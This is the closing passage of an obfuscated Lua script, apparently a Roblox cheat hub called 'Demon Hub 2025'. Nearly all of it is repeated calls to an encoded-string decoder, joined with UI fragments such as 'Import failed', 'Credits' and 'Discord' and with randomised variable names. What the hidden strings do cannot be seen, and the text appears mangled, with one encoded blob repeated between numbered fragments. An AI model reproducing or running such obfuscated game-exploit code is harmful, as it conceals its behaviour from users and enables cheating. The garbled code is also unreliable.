dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)65tabledec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)66booleandec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)67Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)68v_qxtygwvg imported successfullydec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)69Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)70Import failed: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)71Import v_xsqkaegm: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)72v_youefgutdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)73HumanoidRootPartdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)74Creditsdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)75Creditsdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)76Demon Hub 2025 | CORRUPT CORE • Engineered by Alzndec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)77Creditsdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)78Concept legacy upheld — evolution by xc3vhdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)79v_qywpnfavdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)80v_xpakugzedec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)81Discorddec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)82ScreenGuidec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)83v_osonyxrhdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)84v_osonyxrh Showndec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)85v_osonyxrh Hiddendec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)86v_osonyxrhdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)87v_osonyxrh Showndec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)88v_osonyxrh Hidden", 1)
                                                                                                                                    end
                                                                                                                                end
                                                                                                                            end)
                                                                                                                            -- ═══════════════ END OF DEMON HUB 2025 CORE EDITION ═══════════════
